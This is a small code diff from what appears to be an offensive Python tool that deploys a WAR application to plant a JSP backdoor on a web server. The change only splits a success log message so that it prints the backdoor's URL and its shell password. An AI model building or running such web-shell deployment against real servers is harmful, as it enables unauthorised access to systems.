@@ -363,7 +363,8 @@ def main():
         if deployApplication(browser, url, opts.appname, warpath):
             logging.debug('Succeeded, invoking it...')
             if invokeApplication(browser, args[0], opts.appname):
-                logging.info("\033[0;32mJSP Backdoor up & running. Happy pwning, here take that password: '%s'\033[1;0m" % opts.shellpass)
+                logging.info("\033[0;32mJSP Backdoor up & running on http://%s/%s/\033[1;0m" % (args[0], opts.appname))
+                logging.info("\033[0;33mHappy pwning, here take that password: '%s'\033[1;0m" % opts.shellpass)
             else:
                 logging.error("\033[1;41mNo pwning today, backdoor was not deployed.\033[1;0m")
         else:
